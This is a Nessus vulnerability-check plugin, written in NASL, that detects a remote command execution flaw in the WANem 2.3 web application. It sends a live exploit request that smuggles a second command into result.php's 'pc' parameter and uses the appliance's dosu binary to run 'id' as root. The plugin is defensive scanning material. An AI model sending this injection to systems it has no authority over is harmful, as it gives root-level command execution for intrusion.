#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(62737);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_bugtraq_id(55485);
  script_osvdb_id(85345);
  script_xref(name:"EDB-ID", value:"21190");

  script_name(english:"WANem result.php pc Parameter Remote Command Execution");
  script_summary(english:"Tries to exploit command execution vulnerability");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that is affected by a
remote command execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts a version of WANem that is affected by a
remote command execution vulnerability.  The result.php script does not
properly sanitize the 'pc' parameter.  This can allow remote attackers
to execute commands on the remote host, including with root privileges
if utilizing the dosu binary installed on the appliance."
  );
  # http://itsecuritysolutions.org/2012-08-12-WANem-v2.3-multiple-vulnerabilities/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?32a777f5");
  script_set_attribute(
    attribute:"solution",
    value:
"There is no known solution.  As a workaround, either disable or
restrict access to the application."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WANem 2.3 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'WAN Emulator v2.3 Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/10/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:tata:wanem");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wanem_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/wanem");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80);

appname = "WANem";

install = get_install_from_kb(
  appname      : 'wanem', 
  port         : port, 
  exit_on_fail : TRUE
);

dir = install['dir'];
install_url = build_url(port:port, qs:dir);

exploit = dir + '/result.php?pc=127.0.0.1;/UNIONFS/home/perc/dosu%20id';

# the server-side script takes between 10 and 15 seconds to complete
# this is because it runs the 'ping' command
http_set_read_timeout(30);

res = http_send_recv3(method:"GET", 
                      item:exploit,
                      port:port,
                      exit_on_fail:TRUE);

if (
  "uid=0(root)" >< res[2] &&
  "<title>Results of WANalyzer</title>" >< res[2]
)
{
  command_output = NULL;
  item = eregmatch(pattern:"(uid[^<]+)", string: res[2]);
  if (!isnull(item)) command_output = chomp(item[1]);
  
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to exploit the issue to run the \'id\' command using' +
             '\nthe following URL :\n' +
             '\n  ' + build_url(port:port, qs:exploit) + '\n';
  
    if (!isnull(command_output))
      report += '\nHere are the command results :\n\n  ' + command_output + '\n'; 
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
